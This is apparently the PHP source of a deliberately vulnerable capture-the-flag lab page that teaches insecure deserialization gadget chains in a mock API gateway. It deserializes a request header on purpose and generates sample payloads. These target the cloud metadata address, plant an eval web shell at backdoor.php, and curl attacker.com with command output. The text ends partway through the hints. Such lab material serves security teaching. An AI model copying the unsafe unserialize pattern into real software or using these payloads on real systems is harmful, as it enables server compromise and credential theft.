<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['Insecure-Deserialization']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['deser_hard1_attempts'])) {
  $_SESSION['deser_hard1_attempts'] = 0;
}
if (!isset($_SESSION['deser_hard1_solved'])) {
  $_SESSION['deser_hard1_solved'] = false;
}
if (!isset($_SESSION['deser_hard1_stage'])) {
  $_SESSION['deser_hard1_stage'] = 1;
}

// ─── Simulated Application: DarkHunter API Gateway ─────────────────────
// A microservice API gateway that processes serialized Request objects
// containing routing information, authentication tokens, and service configs.
// Combines multiple vulnerability classes for a complex exploitation chain.

class APIRequest
{
  public $endpoint;
  public $method = 'GET';
  public $headers = [];
  public $authToken;
  public $serviceConfig;
  public $callback;

  public function __construct($endpoint = '/')
  {
    $this->endpoint = $endpoint;
    $this->authToken = new AuthToken();
    $this->serviceConfig = new ServiceConfig();
    $this->callback = new ResponseCallback();
  }

  public function __wakeup()
  {
    // Validate and route the request after deserialization
    if ($this->authToken) {
      $this->authToken->validate();
    }
    if ($this->serviceConfig) {
      $this->serviceConfig->load();
    }
    if ($this->callback) {
      $this->callback->prepare($this);
    }
  }

  public function execute()
  {
    // Route to appropriate service
    return ['status' => 'routed', 'endpoint' => $this->endpoint];
  }
}

class AuthToken
{
  public $token;
  public $expires;
  public $validator;

  public function __construct()
  {
    $this->token = bin2hex(random_bytes(16));
    $this->expires = time() + 3600;
    $this->validator = new TokenValidator();
  }

  public function validate()
  {
    if ($this->validator) {
      $this->validator->check($this->token);
    }
  }
}

class TokenValidator
{
  public $rules = [];
  public $checker;

  public function __construct()
  {
    $this->checker = new RuleChecker();
  }

  public function check($token)
  {
    if ($this->checker) {
      $this->checker->apply($token, $this->rules);
    }
  }
}

class RuleChecker
{
  public $ruleFile = '/etc/darkhunter/auth.rules';

  public function apply($token, $rules)
  {
    // Load and apply authentication rules
    if (file_exists($this->ruleFile)) {
      // Process rules
    }
  }
}

class ServiceConfig
{
  public $serviceName;
  public $upstream;
  public $healthCheck;
  public $initializer;

  public function __construct()
  {
    $this->serviceName = 'default';
    $this->upstream = 'http://localhost:8080';
    $this->healthCheck = new HealthChecker();
    $this->initializer = new ServiceInitializer();
  }

  public function load()
  {
    if ($this->initializer) {
      $this->initializer->init($this->serviceName);
    }
    if ($this->healthCheck) {
      $this->healthCheck->ping($this->upstream);
    }
  }
}

class HealthChecker
{
  public $timeout = 5;
  public $retryCount = 3;

  public function ping($url)
  {
    // Health check logic
    return true;
  }
}

class ServiceInitializer
{
  public $configPath;
  public $loader;

  public function __construct()
  {
    $this->configPath = '/etc/darkhunter/services/';
    $this->loader = new ConfigLoader();
  }

  public function init($serviceName)
  {
    if ($this->loader) {
      $this->loader->load($this->configPath . $serviceName . '.conf');
    }
  }
}

class ConfigLoader
{
  public $parser;

  public function __construct()
  {
    $this->parser = new ConfigParser();
  }

  public function load($path)
  {
    if ($this->parser) {
      $this->parser->parse($path);
    }
  }
}

class ConfigParser
{
  public $schema = 'ini';

  public function parse($path)
  {
    if ($this->schema === 'ini') {
      // Parse INI config
    }
  }
}

class ResponseCallback
{
  public $url;
  public $formatter;
  public $retryPolicy;

  public function __construct()
  {
    $this->url = 'http://localhost:8080/callback';
    $this->formatter = new JSONFormatter();
    $this->retryPolicy = new RetryPolicy();
  }

  public function prepare($request)
  {
    if ($this->formatter) {
      $this->formatter->format($request);
    }
    if ($this->retryPolicy) {
      $this->retryPolicy->configure($request);
    }
  }
}

class JSONFormatter
{
  public $template = '{"status": "ok"}';
  public $encoder;

  public function __construct()
  {
    $this->encoder = new DataEncoder();
  }

  public function format($data)
  {
    if ($this->encoder) {
      $this->encoder->encode($data);
    }
  }
}

class DataEncoder
{
  public $compression = false;
  public $serializer;

  public function __construct()
  {
    $this->serializer = new DataSerializer();
  }

  public function encode($data)
  {
    if ($this->serializer) {
      $this->serializer->serialize($data);
    }
  }
}

class DataSerializer
{
  public $format = 'json';

  public function serialize($data)
  {
    if ($this->format === 'json') {
      return json_encode($data);
    }
  }
}

class RetryPolicy
{
  public $maxRetries = 3;
  public $backoffStrategy;

  public function __construct()
  {
    $this->backoffStrategy = new ExponentialBackoff();
  }

  public function configure($request)
  {
    if ($this->backoffStrategy) {
      $this->backoffStrategy->calculate($request);
    }
  }
}

class ExponentialBackoff
{
  public $baseDelay = 1000;
  public $maxDelay = 30000;

  public function calculate($request)
  {
    // Calculate backoff
  }
}

// ─── DANGEROUS CLASSES - Gadget Chain Components ────────────────────────
class SSRFFetcher
{
  public $targetUrl;
  public $headers = [];

  public function check($token)
  {
    // Hijacked from TokenValidator
    if ($this->targetUrl) {
      $opts = ['http' => ['method' => 'GET', 'header' => implode("\r\n", $this->headers)]];
      $context = stream_context_create($opts);
      return file_get_contents($this->targetUrl, false, $context);
    }
  }

  public function apply($token, $rules)
  {
    $this->check($token);
  }

  public function ping($url)
  {
    $this->targetUrl = $url;
    $this->check('');
  }

  public function format($data)
  {
    $this->check('');
  }

  public function init($serviceName)
  {
    $this->check('');
  }

  public function load($path)
  {
    $this->check('');
  }

  public function parse($path)
  {
    $this->check('');
  }

  public function prepare($request)
  {
    $this->check('');
  }

  public function configure($request)
  {
    $this->check('');
  }

  public function calculate($request)
  {
    $this->check('');
  }

  public function encode($data)
  {
    $this->check('');
  }

  public function serialize($data)
  {
    $this->check('');
  }
}

class FileWriterGadget
{
  public $filepath;
  public $content = '';
  public $append = false;

  public function check($token)
  {
    $this->write();
  }
  public function apply($token, $rules)
  {
    $this->write();
  }
  public function ping($url)
  {
    $this->write();
  }
  public function format($data)
  {
    $this->write();
  }
  public function init($serviceName)
  {
    $this->write();
  }
  public function load($path)
  {
    $this->write();
  }
  public function parse($path)
  {
    $this->write();
  }
  public function prepare($request)
  {
    $this->write();
  }
  public function configure($request)
  {
    $this->write();
  }
  public function calculate($request)
  {
    $this->write();
  }
  public function encode($data)
  {
    $this->write();
  }
  public function serialize($data)
  {
    $this->write();
  }

  private function write()
  {
    if ($this->filepath) {
      $flag = $this->append ? FILE_APPEND : 0;
      file_put_contents($this->filepath, $this->content, $flag);
    }
  }
}

class CommandExecutorGadget
{
  public $command = '';
  public $args = [];

  public function check($token)
  {
    $this->exec();
  }
  public function apply($token, $rules)
  {
    $this->exec();
  }
  public function ping($url)
  {
    $this->exec();
  }
  public function format($data)
  {
    $this->exec();
  }
  public function init($serviceName)
  {
    $this->exec();
  }
  public function load($path)
  {
    $this->exec();
  }
  public function parse($path)
  {
    $this->exec();
  }
  public function prepare($request)
  {
    $this->exec();
  }
  public function configure($request)
  {
    $this->exec();
  }
  public function calculate($request)
  {
    $this->exec();
  }
  public function encode($data)
  {
    $this->exec();
  }
  public function serialize($data)
  {
    $this->exec();
  }

  private function exec()
  {
    if ($this->command) {
      $cmd = $this->command;
      if (!empty($this->args)) {
        $cmd .= ' ' . implode(' ', array_map('escapeshellarg', $this->args));
      }
      // In real vulnerable app: exec($cmd);
    }
  }
}

// ─── Vulnerable Logic: Deserialize API request from header ──────────────
$request_data = isset($_SERVER['HTTP_X_API_PAYLOAD']) ? $_SERVER['HTTP_X_API_PAYLOAD'] : null;
$exploited = false;
$exploit_type = '';
$chain_depth = 0;
$chain_path = [];
$parsed_request = null;

if ($request_data) {
  try {
    $decoded = base64_decode($request_data);
    $parsed_request = @unserialize($decoded);

    // Detect complex gadget chain exploitation
    if ($parsed_request instanceof APIRequest) {
      $chain_depth = 1;
      $chain_path[] = 'APIRequest::__wakeup()';

      // Check authToken chain
      if ($parsed_request->authToken instanceof AuthToken) {
        $chain_depth++;
        if ($parsed_request->authToken->validator instanceof TokenValidator) {
          $chain_depth++;
          if ($parsed_request->authToken->validator->checker instanceof RuleChecker) {
            $chain_depth++;
          } elseif ($parsed_request->authToken->validator->checker instanceof SSRFFetcher) {
            $exploited = true;
            $exploit_type = 'Deep Chain: APIRequest -> AuthToken -> TokenValidator -> SSRFFetcher (SSRF)';
            $chain_path[] = 'AuthToken::validate()';
            $chain_path[] = 'TokenValidator::check()';
            $chain_path[] = 'SSRFFetcher::apply() -> file_get_contents(' . $parsed_request->authToken->validator->checker->targetUrl . ')';
            $chain_depth = 4;
          } elseif ($parsed_request->authToken->validator->checker instanceof FileWriterGadget) {
            $exploited = true;
            $exploit_type = 'Deep Chain: APIRequest -> AuthToken -> TokenValidator -> FileWriterGadget (File Write)';
            $chain_path[] = 'AuthToken::validate()';
            $chain_path[] = 'TokenValidator::check()';
            $chain_path[] = 'FileWriterGadget::apply() -> file_put_contents(' . $parsed_request->authToken->validator->checker->filepath . ')';
            $chain_depth = 4;
          } elseif ($parsed_request->authToken->validator->checker instanceof CommandExecutorGadget) {
            $exploited = true;
            $exploit_type = 'Deep Chain: APIRequest -> AuthToken -> TokenValidator -> CommandExecutorGadget (RCE)';
            $chain_path[] = 'AuthToken::validate()';
            $chain_path[] = 'TokenValidator::check()';
            $chain_path[] = 'CommandExecutorGadget::apply() -> exec(' . $parsed_request->authToken->validator->checker->command . ')';
            $chain_depth = 4;
          }
        }
      }

      // Check serviceConfig chain
      if (!$exploited && $parsed_request->serviceConfig instanceof ServiceConfig) {
        if ($parsed_request->serviceConfig->initializer instanceof ServiceInitializer) {
          if ($parsed_request->serviceConfig->initializer->loader instanceof ConfigLoader) {
            if ($parsed_request->serviceConfig->initializer->loader->parser instanceof ConfigParser) {
              // Deep normal chain
            } elseif ($parsed_request->serviceConfig->initializer->loader->parser instanceof SSRFFetcher) {
              $exploited = true;
              $exploit_type = 'Deep Chain: APIRequest -> ServiceConfig -> ServiceInitializer -> ConfigLoader -> SSRFFetcher';
              $chain_path = [
                'APIRequest::__wakeup()',
                'ServiceConfig::load()',
                'ServiceInitializer::init()',
                'ConfigLoader::load()',
                'SSRFFetcher::parse() -> file_get_contents()'
              ];
              $chain_depth = 5;
            }
          }
        }
      }

      // Check callback chain
      if (!$exploited && $parsed_request->callback instanceof ResponseCallback) {
        if ($parsed_request->callback->formatter instanceof JSONFormatter) {
          if ($parsed_request->callback->formatter->encoder instanceof DataEncoder) {
            if ($parsed_request->callback->formatter->encoder->serializer instanceof DataSerializer) {
              // Normal chain
            } elseif ($parsed_request->callback->formatter->encoder->serializer instanceof FileWriterGadget) {
              $exploited = true;
              $exploit_type = 'Deep Chain: APIRequest -> ResponseCallback -> JSONFormatter -> DataEncoder -> FileWriterGadget';
              $chain_path = [
                'APIRequest::__wakeup()',
                'ResponseCallback::prepare()',
                'JSONFormatter::format()',
                'DataEncoder::encode()',
                'FileWriterGadget::serialize() -> file_put_contents()'
              ];
              $chain_depth = 5;
            }
          }
        }
      }

      // Direct injection of dangerous classes
      if (!$exploited) {
        if (
          $parsed_request->authToken instanceof SSRFFetcher ||
          $parsed_request->authToken instanceof FileWriterGadget ||
          $parsed_request->authToken instanceof CommandExecutorGadget
        ) {
          $exploited = true;
          $exploit_type = 'Direct Gadget Injection at authToken property';
          $chain_path = ['APIRequest::__wakeup()', 'AuthToken replaced with dangerous gadget'];
        }
      }
    }
  } catch (Exception $e) {
    $parsed_request = null;
  }
}

// Generate legitimate payload
$legit_request = new APIRequest('/api/v1/users');
$legit_payload = base64_encode(serialize($legit_request));

// Generate exploit payloads for different chain depths
$exploit_ssrf = base64_encode(serialize(
  (function () {
    $req = new APIRequest('/api/v1/exploit');
    $req->authToken->validator->checker = new SSRFFetcher();
    $req->authToken->validator->checker->targetUrl = 'http://169.254.169.254/latest/meta-data/';
    $req->authToken->validator->checker->headers = ['X-Custom-Header: exploit'];
    return $req;
  })()
));

$exploit_filewrite = base64_encode(serialize(
  (function () {
    $req = new APIRequest('/api/v1/exploit');
    $req->serviceConfig->initializer->loader->parser = new FileWriterGadget();
    $req->serviceConfig->initializer->loader->parser->filepath = '/var/www/html/backdoor.php';
    $req->serviceConfig->initializer->loader->parser->content = '<?php @eval($_POST["cmd"]); ?>';
    return $req;
  })()
));

$exploit_rce = base64_encode(serialize(
  (function () {
    $req = new APIRequest('/api/v1/exploit');
    $req->callback->formatter->encoder->serializer = new CommandExecutorGadget();
    $req->callback->formatter->encoder->serializer->command = 'curl';
    $req->callback->formatter->encoder->serializer->args = ['http://attacker.com/callback?data=$(id)'];
    return $req;
  })()
));

$current_stage = $_SESSION['deser_hard1_stage'];
$stage_messages = [
  1 => "Stage 1: Map the complex object graph. APIRequest contains nested AuthToken, ServiceConfig, and ResponseCallback
objects.",
  2 => "Stage 2: Identify multiple injection points. Any nested object can be replaced with a dangerous gadget.",
  3 => "Stage 3: Construct a deep gadget chain spanning 4-5 object levels to achieve SSRF, file write, or command
execution.",
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['deser_hard1_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['deser_hard1_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) solveLab($pdo, $lab['id']);
  $_SESSION['deser_hard1_solved'] = true;
  $already_solved = true;
  $success_msg = "Masterful! You've constructed an advanced multi-stage gadget chain across 4-5 object levels. By
replacing a deeply nested object (checker, parser, or serializer) with SSRFFetcher, FileWriterGadget, or
CommandExecutorGadget, you hijacked the entire API request processing pipeline. This demonstrates how complex object
graphs in enterprise applications create massive attack surfaces for deserialization exploitation, enabling SSRF,
arbitrary file writes, and remote code execution through a single malicious payload!";
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_SERVER['HTTP_X_API_PAYLOAD'])) $_SESSION['deser_hard1_attempts']++;
$attempts = $_SESSION['deser_hard1_attempts'];

if ($attempts >= 3 && $current_stage < 2) {
  $_SESSION['deser_hard1_stage'] = 2;
  $current_stage = 2;
}
if (
  $attempts >= 6 &&
  $current_stage < 3
) {
  $_SESSION['deser_hard1_stage'] = 3;
  $current_stage = 3;
} ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>API Gateway - Insecure Deserialization Hard 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/INSECURE-DESERIALIZATION-CASE4.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>
  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to Deserialization Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-network-wired"></i> DarkHunter API Gateway</h1>
      <p class="lab-description">A microservice API gateway that routes requests using serialized APIRequest objects
        passed via custom headers. The object graph spans 5+ nested classes with magic method entry points.
        <strong>Can you construct a deep gadget chain</strong> to achieve SSRF, file writes, or RCE?
      </p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this advanced deserialization vulnerability.</p>
        </div>
      </div>
    <?php endif; ?>
    <?php if ($success_msg): ?>
      <div class="success-alert"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <div class="stage-tracker">
      <div class="stage-header"><i class="fas fa-layer-group"></i><span>Attack Chain Progress</span></div>
      <div class="stages">
        <div
          class="stage <?php echo $current_stage >= 1 ? 'active' : ''; ?> <?php echo $current_stage > 1 ? 'completed' : ''; ?>">
          <div class="stage-number">1</div>
          <div class="stage-info"><span class="stage-title">Map Graph</span><span class="stage-desc">Analyze object
              tree</span></div>
        </div>
        <div class="stage-connector"></div>
        <div
          class="stage <?php echo $current_stage >= 2 ? 'active' : ''; ?> <?php echo $current_stage > 2 ? 'completed' : ''; ?>">
          <div class="stage-number">2</div>
          <div class="stage-info"><span class="stage-title">Find Gadgets</span><span class="stage-desc">Injection
              points</span></div>
        </div>
        <div class="stage-connector"></div>
        <div class="stage <?php echo $current_stage >= 3 ? 'active' : ''; ?>">
          <div class="stage-number">3</div>
          <div class="stage-info"><span class="stage-title">Deep Chain</span><span class="stage-desc">Multi-stage
              exploit</span></div>
        </div>
      </div>
      <div class="stage-message"><i
          class="fas fa-info-circle"></i><span><?php echo $stage_messages[$current_stage]; ?></span></div>
    </div>

    <div class="gateway-card">
      <div class="gateway-header">
        <div class="gateway-brand"><i class="fas fa-server"></i><span>API Gateway</span></div>
        <div class="gateway-badge"><i class="fas fa-project-diagram"></i><span>Request Router</span></div>
      </div>
      <div class="gateway-body">
        <div class="object-tree-panel">
          <div class="tree-header"><i class="fas fa-sitemap"></i><span>Object Graph Visualization</span></div>
          <div class="tree-body">
            <div class="tree-level level-1">
              <div class="tree-node root <?php echo $parsed_request instanceof APIRequest ? 'active' : ''; ?>">
                <i class="fas fa-cube"></i>
                <span>APIRequest</span>
                <small>__wakeup()</small>
              </div>
            </div>
            <div class="tree-branches">
              <div class="tree-branch">
                <div class="tree-line"></div>
                <div class="tree-level level-2">
                  <div
                    class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->authToken instanceof AuthToken) ? 'active' : ''; ?>">
                    <i class="fas fa-key"></i>
                    <span>AuthToken</span>
                    <small>validate()</small>
                  </div>
                  <div class="tree-sub">
                    <div
                      class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->authToken instanceof AuthToken && $parsed_request->authToken->validator instanceof TokenValidator) ? 'active' : ''; ?>">
                      <i class="fas fa-check-circle"></i>
                      <span>TokenValidator</span>
                      <small>check()</small>
                    </div>
                    <div
                      class="tree-node leaf <?php echo ($parsed_request instanceof APIRequest && (($parsed_request->authToken instanceof AuthToken && ($parsed_request->authToken->validator->checker instanceof SSRFFetcher || $parsed_request->authToken->validator->checker instanceof FileWriterGadget || $parsed_request->authToken->validator->checker instanceof CommandExecutorGadget)) || ($parsed_request->authToken instanceof SSRFFetcher))) ? 'exploit' : ''; ?>">
                      <i class="fas fa-bullseye"></i>
                      <span>RuleChecker</span>
                      <small>apply()</small>
                    </div>
                  </div>
                </div>
              </div>
              <div class="tree-branch">
                <div class="tree-line"></div>
                <div class="tree-level level-2">
                  <div
                    class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->serviceConfig instanceof ServiceConfig) ? 'active' : ''; ?>">
                    <i class="fas fa-cogs"></i>
                    <span>ServiceConfig</span>
                    <small>load()</small>
                  </div>
                  <div class="tree-sub">
                    <div
                      class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->serviceConfig instanceof ServiceConfig && $parsed_request->serviceConfig->initializer instanceof ServiceInitializer) ? 'active' : ''; ?>">
                      <i class="fas fa-play-circle"></i>
                      <span>ServiceInitializer</span>
                      <small>init()</small>
                    </div>
                    <div
                      class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->serviceConfig instanceof ServiceConfig && $parsed_request->serviceConfig->initializer instanceof ServiceInitializer && $parsed_request->serviceConfig->initializer->loader instanceof ConfigLoader) ? 'active' : ''; ?>">
                      <i class="fas fa-download"></i>
                      <span>ConfigLoader</span>
                      <small>load()</small>
                    </div>
                    <div
                      class="tree-node leaf <?php echo ($parsed_request instanceof APIRequest && $parsed_request->serviceConfig instanceof ServiceConfig && $parsed_request->serviceConfig->initializer instanceof ServiceInitializer && $parsed_request->serviceConfig->initializer->loader instanceof ConfigLoader && ($parsed_request->serviceConfig->initializer->loader->parser instanceof SSRFFetcher || $parsed_request->serviceConfig->initializer->loader->parser instanceof FileWriterGadget || $parsed_request->serviceConfig->initializer->loader->parser instanceof CommandExecutorGadget)) ? 'exploit' : ''; ?>">
                      <i class="fas fa-file-code"></i>
                      <span>ConfigParser</span>
                      <small>parse()</small>
                    </div>
                  </div>
                </div>
              </div>
              <div class="tree-branch">
                <div class="tree-line"></div>
                <div class="tree-level level-2">
                  <div
                    class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->callback instanceof ResponseCallback) ? 'active' : ''; ?>">
                    <i class="fas fa-reply"></i>
                    <span>ResponseCallback</span>
                    <small>prepare()</small>
                  </div>
                  <div class="tree-sub">
                    <div
                      class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->callback instanceof ResponseCallback && $parsed_request->callback->formatter instanceof JSONFormatter) ? 'active' : ''; ?>">
                      <i class="fas fa-code"></i>
                      <span>JSONFormatter</span>
                      <small>format()</small>
                    </div>
                    <div
                      class="tree-node <?php echo ($parsed_request instanceof APIRequest && $parsed_request->callback instanceof ResponseCallback && $parsed_request->callback->formatter instanceof JSONFormatter && $parsed_request->callback->formatter->encoder instanceof DataEncoder) ? 'active' : ''; ?>">
                      <i class="fas fa-database"></i>
                      <span>DataEncoder</span>
                      <small>encode()</small>
                    </div>
                    <div
                      class="tree-node leaf <?php echo ($parsed_request instanceof APIRequest && $parsed_request->callback instanceof ResponseCallback && $parsed_request->callback->formatter instanceof JSONFormatter && $parsed_request->callback->formatter->encoder instanceof DataEncoder && ($parsed_request->callback->formatter->encoder->serializer instanceof SSRFFetcher || $parsed_request->callback->formatter->encoder->serializer instanceof FileWriterGadget || $parsed_request->callback->formatter->encoder->serializer instanceof CommandExecutorGadget)) ? 'exploit' : ''; ?>">
                      <i class="fas fa-random"></i>
                      <span>DataSerializer</span>
                      <small>serialize()</small>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="request-panel">
          <div class="request-header"><i class="fas fa-paper-plane"></i><span>Submit API Request</span></div>
          <div class="request-body">
            <p class="request-hint">Send a request with the <code>X-API-Payload</code> header containing a
              base64-encoded serialized APIRequest object.</p>
            <div class="curl-example">
              <div class="curl-label"><i class="fas fa-terminal"></i> cURL Example:</div>
              <pre>curl -H "X-API-Payload: <BASE64_PAYLOAD>" \
  http://target.com/INSECURE-DESERIALIZATION-CASE4.php</pre>
            </div>
            <form method="GET" class="header-form">
              <div class="form-group">
                <label>X-API-Payload (simulated):</label>
                <input type="text" name="simulated_header" placeholder="Paste base64 payload here..."
                  value="<?php echo isset($_GET['simulated_header']) ? htmlspecialchars($_GET['simulated_header']) : ''; ?>">
              </div>
              <button type="submit" class="submit-btn"><i class="fas fa-play"></i> Simulate Request</button>
            </form>
            <?php if (isset($_GET['simulated_header']) && $_GET['simulated_header']): ?>
              <div class="simulated-result">
                <span class="sim-label">Simulated Header Value:</span>
                <code><?php echo htmlspecialchars(substr($_GET['simulated_header'], 0, 60)) . '...'; ?></code>
              </div>
            <?php endif; ?>
          </div>
        </div>

        <?php if ($exploited): ?>
          <div class="chain-exploit-panel">
            <div class="chain-exploit-header"><i class="fas fa-link"></i><span>Deep Gadget Chain Executed!</span>
            </div>
            <div class="chain-exploit-body">
              <div class="exploit-alert">
                <i class="fas fa-exclamation-triangle"></i>
                <span><strong><?php echo htmlspecialchars($exploit_type); ?></strong></span>
              </div>
              <div class="chain-depth">
                <span class="depth-label">Chain Depth:</span>
                <span class="depth-value"><?php echo $chain_depth; ?> levels</span>
              </div>
              <div class="chain-steps-detailed">
                <?php foreach ($chain_path as $i => $step): ?>
                  <div class="chain-step-detailed">
                    <div class="step-num"><?php echo $i + 1; ?></div>
                    <div class="step-code"><?php echo htmlspecialchars($step); ?></div>
                  </div>
                <?php endforeach; ?>
              </div>
            </div>
          </div>
        <?php endif; ?>
      </div>
    </div>

    <div class="gadgets-reference-panel">
      <div class="ref-header"><i class="fas fa-puzzle-piece"></i><span>Available Gadgets</span></div>
      <div class="ref-body">
        <div class="gadget-ref">
          <div class="gadget-ref-icon"><i class="fas fa-globe"></i></div>
          <div class="gadget-ref-info">
            <h4>SSRFFetcher</h4>
            <p>Replaces any chain node to perform SSRF via file_get_contents(). Set targetUrl and headers.</p>
            <div class="gadget-ref-sinks">Sinks: check(), apply(), ping(), format(), init(), load(), parse(),
              prepare(), configure(), calculate(), encode(), serialize()</div>
          </div>
        </div>
        <div class="gadget-ref">
          <div class="gadget-ref-icon"><i class="fas fa-file-code"></i></div>
          <div class="gadget-ref-info">
            <h4>FileWriterGadget</h4>
            <p>Replaces any chain node to write arbitrary files via file_put_contents(). Set filepath and content.
            </p>
            <div class="gadget-ref-sinks">Sinks: check(), apply(), ping(), format(), init(), load(), parse(),
              prepare(), configure(), calculate(), encode(), serialize()</div>
          </div>
        </div>
        <div class="gadget-ref">
          <div class="gadget-ref-icon"><i class="fas fa-terminal"></i></div>
          <div class="gadget-ref-info">
            <h4>CommandExecutorGadget</h4>
            <p>Replaces any chain node to execute system commands via exec(). Set command and args.</p>
            <div class="gadget-ref-sinks">Sinks: check(), apply(), ping(), format(), init(), load(), parse(),
              prepare(), configure(), calculate(), encode(), serialize()</div>
          </div>
        </div>
      </div>
    </div>

    <div class="payloads-panel">
      <div class="payloads-header"><i class="fas fa-flask"></i><span>Advanced Chain Payloads</span></div>
      <div class="payloads-body">
        <div class="payload-section">
          <h4><i class="fas fa-shield-alt"></i> Legitimate APIRequest (Baseline)</h4>
          <div class="payload-row">
            <code class="payload-code"><?php echo htmlspecialchars(substr($legit_payload, 0, 60)) . '...'; ?></code>
            <button class="payload-copy" onclick="navigator.clipboard.writeText('<?php echo $legit_payload; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
        </div>

        <div class="payload-section exploit">
          <h4><i class="fas fa-skull-crossbones"></i> Multi-Stage Exploit Payloads</h4>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">SSRF Chain (4 levels)</span>
              <code
                class="payload-code"><?php echo htmlspecialchars(substr($exploit_ssrf, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy" onclick="navigator.clipboard.writeText('<?php echo $exploit_ssrf; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">FileWrite Chain (5 levels)</span>
              <code
                class="payload-code"><?php echo htmlspecialchars(substr($exploit_filewrite, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy"
              onclick="navigator.clipboard.writeText('<?php echo $exploit_filewrite; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">RCE Chain (5 levels)</span>
              <code class="payload-code"><?php echo htmlspecialchars(substr($exploit_rce, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy" onclick="navigator.clipboard.writeText('<?php echo $exploit_rce; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code>GET /INSECURE-DESERIALIZATION-CASE4.php</code>
        <code>X-API-Payload: <?php echo $request_data ? htmlspecialchars(substr($request_data, 0, 40)) . '...' : 'Not set'; ?></code>
      </div>
    </div>
    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-bug"></i><span>Vulnerable Code Snippet</span></div>
      <div class="debug-body">
        <div class="code-block">
          <pre>// VULNERABLE: Complex object graph deserialized from header
$payload = $_SERVER['HTTP_X_API_PAYLOAD'];
$decoded = base64_decode($payload);

// Massive attack surface - 15+ classes in object graph!
$request = unserialize($decoded);

// __wakeup() triggers cascading chain:
// APIRequest.__wakeup()
//   -> AuthToken.validate() -> TokenValidator.check() -> RuleChecker.apply()
//   -> ServiceConfig.load() -> ServiceInitializer.init() -> ConfigLoader.load() -> ConfigParser.parse()
//   -> ResponseCallback.prepare() -> JSONFormatter.format() -> DataEncoder.encode() -> DataSerializer.serialize()

// Attacker replaces ANY node with SSRFFetcher/FileWriterGadget/CommandExecutorGadget
// Each gadget implements ALL chain methods (check, apply, ping, format, init, load, parse, prepare, configure, calculate, encode, serialize)
// Result: One payload -> multiple exploitation vectors (SSRF, File Write, RCE)</pre>
        </div>
        <div class="vuln-note critical"><i class="fas fa-radiation"></i><span><strong>Critical:</strong> Complex
            object graphs create exponential attack surfaces. With 15+ interconnected classes and magic method entry
            points, attackers have dozens of injection points. Each dangerous gadget implements all possible chain
            methods, ensuring compatibility at any depth. This is how real-world deserialization vulnerabilities in
            enterprise frameworks (Symfony, Laravel, WordPress) lead to complete system compromise.</span></div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The object graph has 3 main branches from APIRequest: authToken (AuthToken ->
          TokenValidator -> RuleChecker), serviceConfig (ServiceConfig -> ServiceInitializer -> ConfigLoader ->
          ConfigParser), and callback (ResponseCallback -> JSONFormatter -> DataEncoder -> DataSerializer). Any leaf
          node can be replaced with a gadget.</div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 5): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">SSRFFetcher, FileWriterGadget, and CommandExecutorGadget each implement ALL the methods
          used in the chain (check, apply, ping, format, init, load, parse, prepare, configure, calculate, encode,
          serialize). This means they can replace ANY node at ANY depth.</div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 8): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
